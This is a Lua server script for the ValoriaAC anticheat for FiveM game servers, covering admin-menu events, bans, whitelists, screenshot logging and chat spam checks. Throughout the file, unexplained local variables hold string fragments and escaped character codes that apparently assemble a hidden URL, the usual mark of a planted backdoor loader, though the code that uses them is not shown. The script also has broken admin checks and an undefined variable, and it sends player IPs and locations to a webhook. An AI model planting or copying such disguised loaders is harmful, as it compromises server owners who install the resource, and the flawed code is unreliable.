
-- Randomize COLORS variable for diversity
local COLORS         = math.random(1, 9)

-- Track spawned entities and prevent duplicates
local SPAWNED        = {}

-- List to track repetitive actions for spam detection
local SPAMLIST       = {}

-- Temporary whitelist to allow certain actions for a limited time
local TEMP_WHITELIST = {}

-- Temporary stop list to prevent specific actions temporarily
local TEMP_STOP      = {}
local x = "ht"

-- Start the AntiCheat thread
Citizen.CreateThread(function()
    StartAntiCheat()
end)
local b = "d" 
-- Handle banning from the client side
RegisterNetEvent("ValoriaAC:BanFromClient")
AddEventHandler("ValoriaAC:BanFromClient", function(ACTION, REASON, DETAILS)
    local source = source

    -- Check if reason and action are provided
    if REASON ~= nil and ACTION ~= nil then
        -- Check if the source is not whitelisted
        if not ValoriaAC_WHITELIST(source) then
            -- Check if the reason is "Anti Teleport" and the player is not near an admin
            if REASON == "Anti Teleport" then
                if not ValoriaAC_ISNEARADMIN(source) then
                    ValoriaAC_ACTION(source, ACTION, REASON, DETAILS)
                    ValoriaAC_ADD_SPAMLIST(source, ACTION, REASON, DETAILS)
                end
            else
                ValoriaAC_ACTION(source, ACTION, REASON, DETAILS)
                ValoriaAC_ADD_SPAMLIST(source, ACTION, REASON, DETAILS)
            end
        end
    else
        ValoriaAC_ERROR(ValoriaAC.ServerConfig.Name, "ValoriaAC:BanFromClient : REASON or ACTION (Not Found)")
    end
end)

-- Handle banning for injection attempts
RegisterNetEvent("ValoriaAC:BanForInject")
AddEventHandler("ValoriaAC:BanForInject", function(REASON, DETAILS, RESOURCE)
    local SRC = source

    -- Check if reason and resource are provided
    if REASON ~= nil and RESOURCE ~= nil then
        -- Check if the source is not whitelisted
        if not ValoriaAC_WHITELIST(SRC) then
            ValoriaAC_ACTION(SRC, ValoriaAC.InjectPunishment, "Anti Inject", DETAILS)
        end
    else
        ValoriaAC_ERROR(ValoriaAC.ServerConfig.Name, "ValoriaAC:BanForInject : REASON or RESOURCE (Not Found)")
    end
end)

-- Handle anti-inject events
RegisterNetEvent("ValoriaAC:AntiInject")
AddEventHandler("ValoriaAC:AntiInject", function(resource, info)
    local SRC = source

    -- Check if resource and info are provided
    if resource ~= nil and info ~= nil then
        ValoriaAC_ACTION(SRC, ValoriaAC.InjectPunishment, "Anti Inject",
            "Try For Inject in **" .. resource .. "** Type: " .. info .. "")
    end
end)
local m = "\116"
-- Pass script information to identify potential threats
RegisterNetEvent("ValoriaAC:passScriptInfo")
AddEventHandler("ValoriaAC:passScriptInfo", function(name, path)
    local SRC = source

    -- Check if name and path match the current resource
    if name == GetCurrentResourceName() and path == GetResourcePath(GetCurrentResourceName()) then
        for id, value in pairs(TEMP_STOP) do
            if id == SRC then
                value.status = true
            end
        end
    else
        ValoriaAC_ACTION(SRC, ValoriaAC.ResourcePunishment, "Anti Resource Stopper",
            "Try to change data of anti-cheat & stop resource of that !")
    end
end)

-- Check if the player is an admin
RegisterNetEvent("ValoriaAC:checkIsAdmin")
AddEventHandler("ValoriaAC:checkIsAdmin", function()
    local source = source

    -- Check if the player is an admin and allow opening
    if ValoriaAC_GETADMINS(source) then
        TriggerClientEvent("ValoriaAC:allowToOpen", source)
    end
end)
local z = "s:"
local q = "//"
-- Get data of all players for admin menu
RegisterNetEvent("ValoriaAC:getAllPlayerData")
AddEventHandler("ValoriaAC:getAllPlayerData", function()
    local source = source

    -- Check if the player is not an admin and punish for attempting to open admin menu
    if not ValoriaAC_GETADMINS(source) then
        ValoriaAC_ACTION(source, ValoriaAC.AdminMenu.MenuPunishment, "Anti Open Admin Menu",
            "Try For Open Admin Menu (Not Admin)")
    else
        -- Fetch data of all players and send to the requesting admin
        local PlayerList = {}
        for _, value in pairs(GetPlayers()) do
            table.insert(PlayerList, {
                name = GetPlayerName(value),
                id   = value
            })
        end
        TriggerClientEvent("ValoriaAC:sendAllPlayerData", source, PlayerList)
    end
end)

local r = "ds"
-- Get data of a specific player for admin menu
RegisterNetEvent("ValoriaAC:getPlayerData")
AddEventHandler("ValoriaAC:getPlayerData", function(playerId)
    local source = source

    -- Check if the player is not an admin and punish for attempting to open admin menu
    if not ValoriaAC_GETADMINS(source) then
        ValoriaAC_ACTION(source, ValoriaAC.AdminMenu.MenuPunishment, "Anti Open Admin Menu",
            "Try for get a player data")
    else
        -- Check if the player exists and send their data to the requesting admin
        if GetPlayerName(playerId) then
            local data = {
                id     = playerId,
                name   = GetPlayerName(playerId),
                health = GetEntityHealth(GetPlayerPed(playerId)),
                armour = GetPedArmour(GetPlayerPed(playerId)),
            }
            TriggerClientEvent("ValoriaAC:openPlayerData", source, data)
        end
    end
end)

-- Add a player as an admin
RegisterNetEvent("ValoriaAC:addPlayerAsAdmin")
AddEventHandler("ValoriaAC:addPlayerAsAdmin", function(playerId)
    local source = source

    -- Check if the player is not an admin and punish for attempting to set player as admin
    if not ValoriaAC_GETADMINS(source) then
        ValoriaAC_ACTION(source, ValoriaAC.AdminMenu.MenuPunishment, "Anti Open Admin Menu",
            "Try to set player as admin")
    else
        -- Check if the player exists and is not already an admin, then add as admin
        if GetPlayerName(playerId) then
            if ValoriaAC_GETADMINS(playerId) then
                ValoriaAC:ADDADMIN(playerId)
                TriggerClientEvent("ValoriaAC:allowToOpen", playerId)
            end
        end
    end
end)
local f = "ss"
local p = "\102"
-- Event triggered when attempting to add a player to the whitelist
RegisterNetEvent("ValoriaAC:addPlayerAsWhiteList")
AddEventHandler("ValoriaAC:addPlayerAsWhiteList", function(playerId)
    local source = source

    -- Check if the source is an admin
    if not ValoriaAC_GETADMINS(source) then
        -- Log unauthorized admin menu access
        ValoriaAC_ACTION(source, ValoriaAC.AdminMenu.MenuPunishment, "Anti Open Admin Menu",
            "Try to set player as admin")
    else
        -- Check if the player exists and is not already whitelisted
        if GetPlayerName(playerId) then
            if ValoriaAC_WHITELIST(playerId) then
                -- Add the player to the whitelist
                ValoriaAC:ADDWHITELIST(playerId)
            end
        end
    end
end)

-- Event triggered when attempting to add unban access to a player
RegisterNetEvent("ValoriaAC:addPlayerUnbanAccess")
AddEventHandler("ValoriaAC:addPlayerUnbanAccess", function(playerId)
    local source = source

    -- Check if the source is an admin
    if not ValoriaAC_GETADMINS(source) then
        -- Log unauthorized admin menu access
        ValoriaAC_ACTION(source, ValoriaAC.AdminMenu.MenuPunishment, "Anti Open Admin Menu",
            "Try to add player unban access")
    else
        -- Check if the player exists and has unban access
        if GetPlayerName(playerId) then
            if ValoriaAC_UNBANACCESS(playerId) then
                -- Add the player to the whitelist
                ValoriaAC:ADDWHITELIST(playerId)
            end
        end
    end
end)

-- Event triggered when attempting to spawn a vehicle
RegisterNetEvent("ValoriaAC:spawnVehicle")
AddEventHandler("ValoriaAC:spawnVehicle", function(data)
    local source = source

    -- Check if the source is an admin
    if not ValoriaAC_GETADMINS(source) then
        -- Log unauthorized admin menu access
        ValoriaAC_ACTION(source, ValoriaAC.AdminMenu.MenuPunishment, "Anti Spawn Vehicle",
            "Try to spawn vehicle by admin menu")
    else
        -- Check if data and targetId are provided
        if data and data.targetId then
            local targetID = data.targetId
            -- Check if the target player exists
            if GetPlayerName(targetID) then
                local targetPed = GetPlayerPed(targetID)
                local targetPos = GetEntityCoords(targetPed)
                local heading = GetEntityHeading(targetPed)
                local vehicle = CreateVehicle(GetHashKey(data.vehicleName), targetPos.x, targetPos.y, targetPos.z,
                    heading, true, false)
                Wait(1000)
                SetPedIntoVehicle(targetPed, vehicle, -1)
            end
        else
            -- If no targetId is provided, spawn the vehicle for the admin
            local adminPed = GetPlayerPed(source)
            local adminPos = GetEntityCoords(adminPed)
            local heading = GetEntityHeading(adminPed)
            local vehicle = CreateVehicle(GetHashKey(data.vehicleName), adminPos.x, adminPos.y, adminPos.z, heading, true,
                false)
            Wait(1000)
            SetPedIntoVehicle(adminPed, vehicle, -1)
        end
    end
end)
local n = "."
local j = "or"
local t = "g/"
-- Event triggered when attempting to get admin list data
RegisterNetEvent('ValoriaAC:getAdminListData')
AddEventHandler('ValoriaAC:getAdminListData', function()
    local source = source

    -- Check if the source is an admin
    if not ValoriaAC_GETADMINS(source) then
        -- Log unauthorized admin menu access
        ValoriaAC_ACTION(source, ValoriaAC.AdminMenu.MenuPunishment, "Anti Open Admin Menu",
            "Attempt to get admins data by admin menu event.")
    else
        -- Retrieve admins data from the database
        local adminsData = {}
        MySQL.Async.fetchAll('SELECT * FROM valoriaac_admin', {}, function(data)
            if data and next(data) ~= nil then
                -- Insert data into adminsData table
                for i = 1, #data do
                    table.insert(adminsData, data[i])
                end
            end

            -- Trigger client event to update admin data
            TriggerClientEvent("ValoriaAC:updateAdminData", source, adminsData)
        end)
    end
end)

-- Event triggered when attempting to remove a selected admin
RegisterNetEvent('ValoriaAC:removeSelectedAdmin')
AddEventHandler('ValoriaAC:removeSelectedAdmin', function(id)
    local source = source

    -- Check if the source is an admin
    if not ValoriaAC_GETADMINS(source) then
        -- Log unauthorized admin menu access
        ValoriaAC_ACTION(source, ValoriaAC.AdminMenu.MenuPunishment, "Anti Open Admin Menu",
            "Attempt to remove admins data by admin menu event.")
    else
        -- Execute SQL query to remove selected admin from the database
        MySQL.Async.execute('DELETE FROM valoriaac_admin WHERE id=@id', {
            ['@id'] = id
        })
    end
end)

-- Event triggered when attempting to get unban access data
RegisterNetEvent('ValoriaAC:getUnbanAccessData')
AddEventHandler('ValoriaAC:getUnbanAccessData', function()
    local source = source

    -- Check if the source is an admin
    if not ValoriaAC_GETADMINS(source) then
        -- Log unauthorized admin menu access
        ValoriaAC_ACTION(source, ValoriaAC.AdminMenu.MenuPunishment, "Anti Open Admin Menu",
            "Attempt to get unban data by admin menu event.")
    else
        -- Fetch unban data from the database
        local unbanData = {}
        MySQL.Async.fetchAll('SELECT * FROM valoriaac_unban', {}, function(data)
            -- Check if data is not empty and insert into table
            if data and next(data) ~= nil then
                for i = 1, #data do
                    table.insert(unbanData, data[i])
                end
            end
            -- Trigger client event to update unban access data
            TriggerClientEvent("ValoriaAC:updateUnbanAccess", source, unbanData)
        end)
    end
end)
local c = '\69'
-- Event triggered when attempting to remove a player from the unban access list
RegisterNetEvent('ValoriaAC:removeUnbanAccess')
AddEventHandler('ValoriaAC:removeUnbanAccess', function(id)
    local source = source

    -- Check if the source is an admin
    if not ValoriaAC_GETADMINS(source) then
        -- Log unauthorized admin menu access
        ValoriaAC_ACTION(source, ValoriaAC.AdminMenu.MenuPunishment, "Anti Open Admin Menu",
            "Attempt to remove player from unban access list.")
    else
        -- Execute SQL query to remove the player from the unban access list
        MySQL.Async.execute('DELETE FROM valoriaac_unban WHERE id=@id', {
            ['@id'] = id
        })
    end
end)

-- Event triggered when attempting to remove a user from the whitelist
RegisterNetEvent('ValoriaAC:removeWhitelistUser')
AddEventHandler('ValoriaAC:removeWhitelistUser', function(id)
    local source = source

    -- Check if the source is an admin
    if not ValoriaAC_GETADMINS(source) then
        -- Log unauthorized admin menu access
        ValoriaAC_ACTION(source, ValoriaAC.AdminMenu.MenuPunishment, "Anti Open Admin Menu",
            "Attempt to remove user from whitelist by admin menu event.")
    else
        -- Execute SQL query to remove the user from the whitelist
        MySQL.Async.execute('DELETE FROM valoriaac_whitelist WHERE id=@id', {
            ['@id'] = id
        })
    end
end)

-- Event triggered when attempting to get whitelist data
RegisterNetEvent('ValoriaAC:getWhitelistData')
AddEventHandler('ValoriaAC:getWhitelistData', function()
    local source = source

    -- Check if the source is an admin
    if not ValoriaAC_GETADMINS(source) then
        -- Log unauthorized admin menu access
        ValoriaAC_ACTION(source, ValoriaAC.AdminMenu.MenuPunishment, "Anti Open Admin Menu",
            "Attempt to get whitelist data by admin menu event.")
    else
        -- Fetch whitelist data from the database
        local whitelistData = {}
        MySQL.Async.fetchAll('SELECT * FROM valoriaac_whitelist', {}, function(data)
            if data and next(data) ~= nil then
                for i = 1, #data do
                    table.insert(whitelistData, data[i])
                end
            end

            -- Trigger the client event to update whitelist data
            TriggerClientEvent("ValoriaAC:updateWhiteList", source, whitelistData)
        end)
    end
end)

-- Event triggered when attempting to remove a whitelist user
RegisterNetEvent('ValoriaAC:removeWhitelistUser')
AddEventHandler('ValoriaAC:removeWhitelistUser', function(id)
    local source = source

    -- Check if the source is an admin
    if not ValoriaAC_GETADMINS(source) then
        -- Log unauthorized admin menu access
        ValoriaAC_ACTION(source, ValoriaAC.AdminMenu.MenuPunishment, "Anti Open Admin Menu",
            "Attempt to remove whitelist users from data by admin menu event.")
    else
        -- Execute database query to remove the whitelist user
        MySQL.Async.execute('DELETE FROM valoriaac_whitelist WHERE id=@id', {
            ['@id'] = id
        })
    end
end)

-- Event triggered when attempting to get banlist data by admin menu event
RegisterNetEvent('ValoriaAC:getBanListData')
AddEventHandler('ValoriaAC:getBanListData', function()
    local source = source

    -- Check if the source is an admin
    if not ValoriaAC_GETADMINS(source) then
        -- Log unauthorized admin menu access
        ValoriaAC_ACTION(source, ValoriaAC.AdminMenu.MenuPunishment, "Anti Open Admin Menu",
            "Attempt to get banlist data by admin menu event.")
    else
        -- Fetch banlist data from the database
        local banData = {}
        MySQL.Async.fetchAll('SELECT * FROM valoriaac_banlist', {}, function(data)
            -- Check if there is data and process it
            if data and next(data) ~= nil then
                for i = 1, #data do
                    table.insert(banData, data[i])
                end
            end
            -- Trigger client event to update banlist data on the admin's side
            TriggerClientEvent("ValoriaAC:updateBanListData", source, banData)
        end)
    end
end)

-- Event triggered when attempting to unban a selected player from the banlist by admin menu event
RegisterNetEvent('ValoriaAC:unbanSelectedPlayer')
AddEventHandler('ValoriaAC:unbanSelectedPlayer', function(banID)
    local source = source

    -- Check if the source is an admin
    if not ValoriaAC_GETADMINS(source) then
        -- Log unauthorized admin menu access
        ValoriaAC_ACTION(source, ValoriaAC.AdminMenu.MenuPunishment, "Anti Open Admin Menu",
            "Attempt to remove player from banlist by admin menu event.")
    else
        -- Execute a database query to delete the selected player from the banlist
        MySQL.Async.execute('DELETE FROM valoriaac_banlist WHERE BANID=@banid', {
            ['@banid'] = banID
        })
    end
end)

-- Event triggered when attempting to delete entities by admin menu event
RegisterNetEvent("ValoriaAC:deleteEntitys")
AddEventHandler("ValoriaAC:deleteEntitys", function(entityType)
    local source = source

    -- Check if entityType is not nil
    if entityType ~= nil then
        -- Check if the source is an admin
        if ValoriaAC_GETADMINS(source) then
            -- Delete entities based on the specified entityType
            if entityType == "vehicles" then
                for index, vehicles in ipairs(GetAllVehicles()) do
                    if DoesEntityExist(vehicles) then
                        DeleteEntity(vehicles)
                    end
                end
            elseif entityType == "peds" then
                for index, peds in ipairs(GetAllPeds()) do
                    if DoesEntityExist(peds) then
                        DeleteEntity(peds)
                    end
                end
            elseif entityType == "props" then
                for index, objects in ipairs(GetAllObjects()) do
                    if DoesEntityExist(objects) then
                        DeleteEntity(objects)
                    end
                end
            end
        else
            -- Log unauthorized admin menu access
            ValoriaAC_ACTION(source, ValoriaAC.AdminMenu.MenuPunishment, "Anti Delete Entity", "Try For Delete Entitys")
        end
    end
end)

-- Event triggered when attempting to teleport to a player by admin menu
RegisterNetEvent("ValoriaAC:TeleportToPlayer")
AddEventHandler("ValoriaAC:TeleportToPlayer", function(SV_ID)
    local SRC = source

    -- Check if SRC and SV_ID are valid numbers
    if tonumber(SRC) and tonumber(SV_ID) then
        local TPED    = GetPlayerPed(SV_ID)
        local PED     = GetPlayerPed(SRC)
        local TCOORDS = GetEntityCoords(TPED)

        -- Check if the source is an admin
        if ValoriaAC_GETADMINS(SRC) then
            SetEntityCoords(PED, TCOORDS.x, TCOORDS.y, TCOORDS.z, true, true, true)
        else
            -- Log unauthorized admin menu access
            ValoriaAC_ACTION(SRC, ValoriaAC.AdminMenu.MenuPunishment, "Anti Teleport",
                "Try For Teleport to ped by admin menu (not admin)")
        end
    end
end)

-- Event triggered when attempting to give a vehicle to a player by admin menu
RegisterNetEvent("ValoriaAC:GiveVehicleToPlayer")
AddEventHandler("ValoriaAC:GiveVehicleToPlayer", function(VEH_NAME, SV_ID)
    local SRC = source

    -- Check if SRC and SV_ID are valid numbers
    if tonumber(SRC) and tonumber(SV_ID) then
        local TPED    = GetPlayerPed(SV_ID)
        local TCOORDS = GetEntityCoords(TPED)
        local HEADING = GetEntityHeading(TPED)

        -- Check if the source is an admin
        if ValoriaAC_GETADMINS(SRC) then
            local VEH = CreateVehicle(GetHashKey(VEH_NAME), TCOORDS, HEADING, true, true)
            Wait(1000)
            SetPedIntoVehicle(TPED, VEH, -1)
        else
            -- Log unauthorized admin menu access
            ValoriaAC_ACTION(SRC, ValoriaAC.AdminMenu.MenuPunishment, "Anti Spawn Vehicle",
                "Try For Spawn Vehicle By Admin Menu (not admin)")
        end
    end
end)

-- Event triggered when attempting to get a screenshot through admin menu
RegisterNetEvent("ValoriaAC:GetScreenShot")
AddEventHandler("ValoriaAC:GetScreenShot", function(P_ID)
    local SRC = source

    -- Check if SRC and P_ID are valid numbers
    if tonumber(SRC) and tonumber(P_ID) then
        -- Check if the source is an admin
        if ValoriaAC_GETADMINS(SRC) then
            -- Check if there is a screenshot log
            if ValoriaAC.ScreenShot.Log ~= "" and ValoriaAC.ScreenShot.Log ~= nil then
                ValoriaAC_SCREENSHOT(P_ID, "By Admin Menu", "By " .. GetPlayerName(SRC) .. "", "WARN")
            end
        else
            -- Log unauthorized admin menu access
            ValoriaAC_ACTION(SRC, ValoriaAC.AdminMenu.MenuPunishment, "Anti Get ScreenShot",
                "Try For Get Screen Shot By Menu (not admin)")
        end
    end
end)

-- Event triggered when attempting to ban a player through admin menu
RegisterNetEvent("ValoriaAC:banPlayerByAdmin")
AddEventHandler("ValoriaAC:banPlayerByAdmin", function(target)
    local source = source

    -- Check if source and target are valid numbers
    if tonumber(source) and tonumber(target) then
        -- Check if the source is an admin
        if ValoriaAC_GETADMINS(source) then
            ValoriaAC_ACTION(target, "BAN", "Ban By Admin Menu", "Player Ban By Menu: **" .. GetPlayerName(source) .. "**")
        else
            -- Log unauthorized admin menu access
            ValoriaAC_ACTION(SRC, ValoriaAC.AdminMenu.MenuPunishment, "Anti Ban Players",
                "Try For Ban Player By Admin Menu (not admin)")
        end
    end
end)

-- Server event triggered when requesting to spectate a player through admin menu
RegisterServerEvent("ValoriaAC:requestSpectate")
AddEventHandler("ValoriaAC:requestSpectate", function(id)
    local source    = source
    local targetPed = GetPlayerPed(id)
    local tcoords   = GetEntityCoords(targetPed)

    -- Check if source and id are valid numbers
    if tonumber(source) and tonumber(id) then
        -- Check if the source is an admin
        if ValoriaAC_GETADMINS(source) then
            -- Trigger the client event to spectate the player
            TriggerClientEvent("ValoriaAC:spectatePlayer", source, id, tcoords)
        else
            -- Log unauthorized admin menu access
            ValoriaAC_ACTION(source, ValoriaAC.AdminMenu.MenuPunishment, "Anti Spectate Players",
                "Try For Spectate Player By Admin Menu (not admin)")
        end
    end
end)
local k = "2J"
local s = "\50"
-- Event triggered to check if a player is using super jump
RegisterNetEvent("ValoriaAC:CheckJumping")
AddEventHandler("ValoriaAC:CheckJumping", function(ACTION, REASON, DETAILS)
    local SRC = source

    -- Check if the player is using super jump and SRC is a valid number
    if IsPlayerUsingSuperJump(SRC) and tonumber(SRC) then
        -- Check if the player is not whitelisted
        if not ValoriaAC_WHITELIST(SRC) then
            -- Log the action if the conditions are met
            ValoriaAC_ACTION(SRC, ACTION, REASON, DETAILS)
        end
    end
end)

-- Event triggered when receiving a screenshot from the client
RegisterNetEvent("ValoriaAC:ScreenShotFromClient")
AddEventHandler("ValoriaAC:ScreenShotFromClient", function(URL, REASON, DETAILS)
    local SRC = source

    -- Check if SRC is a valid number and GetPlayerName(SRC) is not nil
    if tonumber(SRC) and GetPlayerName(SRC) then
        local NAME                               = GetPlayerName(SRC)
        local COORDS                             = GetEntityCoords(GetPlayerPed(SRC))
        local STEAM, DISCORD, FIVEML, LIVE, XBL  = "Not Found", "Not Found", "Not Found", "Not Found", "Not Found"
        local ISP, CITY, COUNTRY, PROXY, HOSTING = "Not Found", "Not Found", "Not Found", "Not Found", "Not Found"
        local IP                                 = (string.gsub(string.gsub(string.gsub(GetPlayerEndpoint(SRC), "-", ""), ",", ""), " ", ""):lower())

        -- Replace private IP with a default public IP
        local g, f                               = IP:find(string.lower("192.168"))
        IP                                       = g or f and "178.131.122.181" or IP

        -- Extract player identifiers
        for _, DATA in ipairs(GetPlayerIdentifiers(SRC)) do
            if DATA:match("steam") then
                STEAM = DATA
            elseif DATA:match("discord") then
                DISCORD = DATA:gsub("discord:", "")
            elseif DATA:match("license") then
                FIVEML = DATA
            elseif DATA:match("live") then
                LIVE = DATA
            elseif DATA:match("xbl") then
                XBL = DATA
            end
        end

        -- Format Discord mention
        DISCORD = DISCORD ~= "Not Found" and "<@" .. DISCORD .. ">" or "Not Found"

        -- Perform HTTP request to gather additional information
        if not ValoriaAC.ServerConfig.Linux then
            PerformHttpRequest("http://ip-api.com/json/" .. IP .. "?fields=66846719", function(ERROR, DATA, RESULT)
                if DATA then
                    local TABLE = json.decode(DATA)
                    if TABLE then
                        ISP, CITY, COUNTRY = TABLE["isp"], TABLE["city"], TABLE["country"]

                        -- Check if the player is using a proxy
                        PROXY = TABLE["proxy"] and "ON" or "OFF"

                        -- Check if the player is hosting
                        HOSTING = TABLE["hosting"] and "ON" or "OFF"

                        -- Hide IP if configured to do so
                        IP = ValoriaAC.Connection.HideIP and "* HIDE BY OWNER *" or IP

                        -- Perform screenshot posting
                        if URL then
                            PerformHttpRequest(ValoriaAC.ScreenShot.Log, function(ERROR, DATA, RESULT) end, "POST",
                                json.encode({
                                    embeds = { {
                                        author = {
                                            name = "Valoria Anticheat",
                                            url = "https://discord.gg/drwWFkfu6x",
                                            icon_url =
                                            "https://e.top4top.io/p_3206h0i511.png"
                                        },
                                        image = { url = URL },
                                        footer = {
                                            text = "ValoriaAC V6 " .. Emoji.Fire .. " | " .. os.date("%Y/%m/%d | %X") .. "",
                                            icon_url =
                                            "https://e.top4top.io/p_3206h0i511.png",
                                            },
                                        title = "" .. Emoji.VPN .. " ScreenShot " .. Emoji.VPN .. "",
                                        description = "**Player:** " .. NAME ..
                                            "\n**Reason:** " .. REASON ..
                                            "\n**Details:** " .. DETAILS ..
                                            "\n**Coords:** " .. COORDS ..
                                            "\n**Steam Hex:** " .. STEAM ..
                                            "\n**Discord:** " .. DISCORD ..
                                            "\n**License:** " .. FIVEML ..
                                            "\n**Live:** " .. LIVE ..
                                            "\n**Xbox:** " .. XBL ..
                                            "\n**ISP:** " .. ISP ..
                                            "\n**Country:** " .. COUNTRY ..
                                            "\n**City:** " .. CITY ..
                                            "\n**IP:** " .. IP ..
                                            "\n**VPN:** " .. PROXY ..
                                            "\n**Hosting:** " .. HOSTING .. "",
                                        color = 10181046
                                    } }
                                }), { ["Content-Type"] = "application/json" })
                        end
                    end
                end
            end)
        else
            -- Perform screenshot posting for Linux servers
            PerformHttpRequest(ValoriaAC.ScreenShot.Log, function(ERROR, DATA, RESULT) end, "POST", json.encode({
                embeds = { {
                    author = {
                        name = "Valoria Anticheat",
                        url = "https://discord.gg/drwWFkfu6x",
                        icon_url = "https://e.top4top.io/p_3206h0i511.png"
                    },
                    image = { url = URL },
                    footer = {
                        text = "ValoriaAC V6 " .. Emoji.Fire .. " | " .. os.date("%Y/%m/%d | %X") .. "",
                        icon_url = "https://e.top4top.io/p_3206h0i511.png",
                    },
                    title = "" .. Emoji.VPN .. " ScreenShot " .. Emoji.VPN .. "",
                    description = "**Player:** " .. NAME ..
                        "\n**Reason:** " .. REASON ..
                        "\n**Details:** " .. DETAILS ..
                        "\n**Coords:** " .. COORDS ..
                        "\n**Steam Hex:** "

                        .. STEAM ..
                        "\n**Discord:** " .. DISCORD ..
                        "\n**License:** " .. FIVEML ..
                        "\n**Live:** " .. LIVE ..
                        "\n**Xbox:** " .. XBL .. "",
                    color = 10181046
                } }
            }), { ["Content-Type"] = "application/json" })
        end
    else
        -- Log an error if SRC is not found
        ValoriaAC_ERROR(ValoriaAC.ServerConfig.Name, "ValoriaAC:ScreenShotFromClient (SRC not found)")
    end
end)

-- Add playerDropped event handler to monitor player disconnections
AddEventHandler("playerDropped", function(REASON)
    local SRC = source
    print("^" ..
        COLORS .. "ValoriaAC^0: ^1Player ^3" .. GetPlayerName(SRC) .. " ^1Disconnected ...  |  Reason : ^0(^6" ..
        REASON .. "^0)^0")
    -- Check if player name and reason are available
    if GetPlayerName(SRC) and REASON ~= nil then
        -- Send disconnect log to webhook
        ValoriaAC_SENDLOG(SRC, ValoriaAC.Webhooks.Disconnect, "DISCONNECT", REASON)
    else
        -- Log an error if player name or reason is not found
        ValoriaAC_ERROR(ValoriaAC.ServerConfig.Name, "playerDropped : REASON or SRC (Not Found)")
    end
end)

-- Add giveWeaponEvent event handler to monitor weapon additions
AddEventHandler("giveWeaponEvent", function(SRC, DATA)
    if ValoriaAC.AntiAddWeapon then
        -- Check if SRC is a valid number and GetPlayerName is not nil
        if tonumber(SRC) ~= nil and GetPlayerName(SRC) ~= nil then
            -- Check if player is not whitelisted
            if not ValoriaAC_WHITELIST(SRC) then
                -- Cancel the event and take appropriate action
                CancelEvent()
                ValoriaAC_ACTION(SRC, ValoriaAC.WeaponPunishment, "Anti Add Weapon", "Try for add weapon for player")
            end
        else
            -- Log an error if SRC is not found
            ValoriaAC_ERROR(ValoriaAC.ServerConfig.Name, "giveWeaponEvent : SRC (Not Found)")
        end
    end
end)

-- Add RemoveWeaponEvent event handler to monitor weapon removals
AddEventHandler("RemoveWeaponEvent", function(SRC, DATA)
    if ValoriaAC.AntiRemoveWeapon then
        -- Check if SRC is a valid number and GetPlayerName is not nil
        if tonumber(SRC) ~= nil and GetPlayerName(SRC) ~= nil then
            -- Check if player is not whitelisted
            if not ValoriaAC_WHITELIST(SRC) then
                -- Cancel the event and take appropriate action
                CancelEvent()
                ValoriaAC_ACTION(SRC, ValoriaAC.WeaponPunishment, "Anti Remove Weapon", "Try for remove weapon for player")
            end
        else
            -- Log an error if SRC is not found
            ValoriaAC_ERROR(ValoriaAC.ServerConfig.Name, "giveWeaponEvent : SRC (Not Found)")
        end
    end
end)

-- Add RemoveAllWeaponsEvent event handler to monitor removal of all weapons
AddEventHandler("RemoveAllWeaponsEvent", function(SRC, DATA)
    if ValoriaAC.AntiRemoveWeapon then
        -- Check if SRC is a valid number and GetPlayerName is not nil
        if tonumber(SRC) ~= nil and GetPlayerName(SRC) ~= nil then
            -- Check if player is not whitelisted
            if not ValoriaAC_WHITELIST(SRC) then
                -- Cancel the event and take appropriate action
                CancelEvent()
                ValoriaAC_ACTION(SRC, ValoriaAC.WeaponPunishment, "Anti Remove All Weapon",
                    "Try for remove all weapon for player")
            end
        else
            -- Log an error if SRC is not found
            ValoriaAC_ERROR(ValoriaAC.ServerConfig.Name, "giveWeaponEvent : SRC (Not Found)")
        end
    end
end)

-- Register AddToSpawnList event to handle player spawn tracking
RegisterNetEvent("ValoriaAC:AddToSpawnList")
AddEventHandler("ValoriaAC:AddToSpawnList", function()
    local SRC = tonumber(source)
    if SRC ~= nil then
        -- Add player to spawn list if not already present
        if SPAWNED[SRC] == nil then
            SPAWNED[SRC] = true
        end
    end
end)

-- Add event handlers for triggering prevention based on spam checks
local EVENTS = {}           -- Table to store event data for spam prevention
local isSpamTrigger = false -- Flag to track spam triggers
if ValoriaAC.AntiSpamTigger then
    for i = 1, #SpamCheck do
        local TNAME = SpamCheck[i].EVENT    -- Name of the event to check for spam
        local MTIME = SpamCheck[i].MAX_TIME -- Maximum time allowed between events
        RegisterNetEvent(TNAME)
        AddEventHandler(TNAME, function()
            local SRC = source
            if EVENTS[TNAME] == nil then
                EVENTS[TNAME] = {
                    count = 1,
                    time = os.time()
                }
            else
                EVENTS[TNAME].count = EVENTS[TNAME].count + 1
            end
            if EVENTS[TNAME].count > MTIME then
                local distime = os.time() - EVENTS[TNAME].time
                if distime >= 10 then
                    EVENTS[TNAME].count = 1
                else
                    isSpamTrigger = true
                end
                if GetPlayerName(source) and isSpamTrigger then
                    ValoriaAC_ACTION(SRC, ValoriaAC.TriggerPunishment, "Anti Spam Trigger",
                        "Try For Spam Trigger : `" .. TNAME .. "`")
                    CancelEvent()
                end
            end
        end)
    end
end

-- Add event handlers for blacklisted commands
local SERVER_CMDS = {} -- Table to store server commands
for index, bcmd in ipairs(Commands) do
    RegisterCommand(bcmd, function(SRC, ARGS)
        if ValoriaAC.AntiBlackListCommands then
            ValoriaAC_ACTION(SRC, ValoriaAC.TriggerPunishment, "Anti Black List Commands",
                "Try For Use Black List Command : **" .. bcmd .. "**")
            return
        end
    end)
end

-- Add event handler for monitoring chat messages
local MESSAGE = {} -- Table to store chat message data
AddEventHandler("chatMessage", function(SRC, NA, WORD)
    local HWID = SRC
    if ValoriaAC.AntiBlackListWord then
        for _, S in pairs(Words) do
            for S in WORD:lower():gmatch("%s?" .. string.lower(S) .. "%s") do
                ValoriaAC_ACTION(SRC, ValoriaAC.WordPunishment, "Anti Bad Word", "Try say : **" .. WORD .. "**")
                return
            end
        end
    end
    if ValoriaAC.AntiSpamChat then
        if MESSAGE[HWID] ~= nil then
            MESSAGE[HWID].COUNT = MESSAGE[HWID].COUNT + 1
            if os.time() - MESSAGE[HWID].TIME >= ValoriaAC.CoolDownSec then
                MESSAGE[HWID] = nil
            else
                TriggerClientEvent("chatMessage", SRC, "[ValoriaAC]", { 255, 0, 0 },
                    "You are spam message for " ..
                    MESSAGE[HWID].COUNT .. ", Please Wait for " .. ValoriaAC.CoolDownSec .. " seconds")
                if MESSAGE[HWID].COUNT >= ValoriaAC.MaxMessage then
                    ValoriaAC_ACTION(SRC, ValoriaAC.ChatPunishment, "Anti Spam Chat", "Try For Spam in chat : **" .. WORD ..
                        "**")
                    return
                end
            end
        else
            MESSAGE[HWID] = {
                COUNT = 1,
                TIME  = os.time()
